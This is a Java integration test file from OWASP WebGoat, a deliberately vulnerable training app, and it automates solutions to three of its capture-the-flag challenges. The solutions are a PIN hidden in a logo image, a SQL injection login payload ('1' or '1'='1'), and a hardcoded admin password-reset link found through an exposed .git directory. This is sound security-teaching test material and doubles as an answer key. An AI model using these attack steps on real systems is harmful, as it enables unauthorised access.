package org.owasp.webgoat;

import static org.junit.jupiter.api.Assertions.assertTrue;

import io.restassured.RestAssured;
import java.util.Arrays;
import java.util.List;
import java.util.Map;
import org.assertj.core.api.Assertions;
import org.junit.jupiter.api.Test;
import org.springframework.http.HttpStatus;

public class ChallengeIntegrationTest extends IntegrationTest {

  @Test
  void testChallenge1() {
    startLesson("Challenge1");

    byte[] resultBytes =
        RestAssured.given()
            .when()
            .relaxedHTTPSValidation()
            .cookie("JSESSIONID", getWebGoatCookie())
            .get(url("challenge/logo"))
            .then()
            .statusCode(200)
            .extract()
            .asByteArray();

    String pin = new String(Arrays.copyOfRange(resultBytes, 81216, 81220));
    Map<String, Object> params =
        Map.of("username", "admin", "password", "!!webgoat_admin_%s!!".formatted(pin));

    String result =
        RestAssured.given()
            .when()
            .relaxedHTTPSValidation()
            .cookie("JSESSIONID", getWebGoatCookie())
            .formParams(params)
            .post(url("challenge/1"))
            .then()
            .statusCode(200)
            .extract()
            .asString();

//    String flag = result.substring(result.indexOf("flag") + 6, result.indexOf("flag") + 42);
//    checkAssignment(url("challenge/flag"), Map.of("flag", flag), true);

    checkResults("/challenge/1");

    List<String> capturefFlags =
        RestAssured.given()
            .when()
            .relaxedHTTPSValidation()
            .cookie("JSESSIONID", getWebGoatCookie())
            .get(url("scoreboard-data"))
            .then()
            .statusCode(200)
            .extract()
            .jsonPath()
            .get("find { it.username == \"" + this.getUser() + "\" }.flagsCaptured");
    assertTrue(capturefFlags.contains("Admin lost password"));
  }

  @Test
  void testChallenge5() {
    startLesson("Challenge5");

    Map<String, Object> params =
        Map.of("username_login", "Larry", "password_login", "1' or '1'='1");

    String result =
        RestAssured.given()
            .when()
            .relaxedHTTPSValidation()
            .cookie("JSESSIONID", getWebGoatCookie())
            .formParams(params)
            .post(url("challenge/5"))
            .then()
            .statusCode(200)
            .extract()
            .asString();

    String flag = result.substring(result.indexOf("flag") + 6, result.indexOf("flag") + 42);
    checkAssignment(url("challenge/flag"), Map.of("flag", flag), true);

    checkResults("/challenge/5");

    List<String> capturefFlags =
        RestAssured.given()
            .when()
            .relaxedHTTPSValidation()
            .cookie("JSESSIONID", getWebGoatCookie())
            .get(url("scoreboard-data"))
            .then()
            .statusCode(200)
            .extract()
            .jsonPath()
            .get("find { it.username == \"" + this.getUser() + "\" }.flagsCaptured");
    assertTrue(capturefFlags.contains("Without password"));
  }

  @Test
  void testChallenge7() {
    startLesson("Challenge7");
    cleanMailbox();

    // One should first be able to download git.zip from WebGoat
    RestAssured.given()
        .when()
        .relaxedHTTPSValidation()
        .cookie("JSESSIONID", getWebGoatCookie())
        .get(url("challenge/7/.git"))
        .then()
        .statusCode(200)
        .extract()
        .asString();

    // Should send an email to WebWolf inbox this should give a hint to the link being static
    RestAssured.given()
        .when()
        .relaxedHTTPSValidation()
        .cookie("JSESSIONID", getWebGoatCookie())
        .formParams("email", getUser() + "@webgoat.org")
        .post(url("challenge/7"))
        .then()
        .statusCode(200)
        .extract()
        .asString();

    // Check whether email has been received
    var responseBody =
        RestAssured.given()
            .when()
            .relaxedHTTPSValidation()
            .cookie("WEBWOLFSESSION", getWebWolfCookie())
            .get(webWolfUrl("mail"))
            .then()
            .extract()
            .response()
            .getBody()
            .asString();
    Assertions.assertThat(responseBody).contains("Hi, you requested a password reset link");

    // Call reset link with admin link
    String result =
        RestAssured.given()
            .when()
            .relaxedHTTPSValidation()
            .cookie("JSESSIONID", getWebGoatCookie())
            .get(url("challenge/7/reset-password/{link}"), "375afe1104f4a487a73823c50a9292a2")
            .then()
            .statusCode(HttpStatus.ACCEPTED.value())
            .extract()
            .asString();

    String flag = result.substring(result.indexOf("flag") + 6, result.indexOf("flag") + 42);
    checkAssignment(url("challenge/flag"), Map.of("flag", flag), true);
  }
}
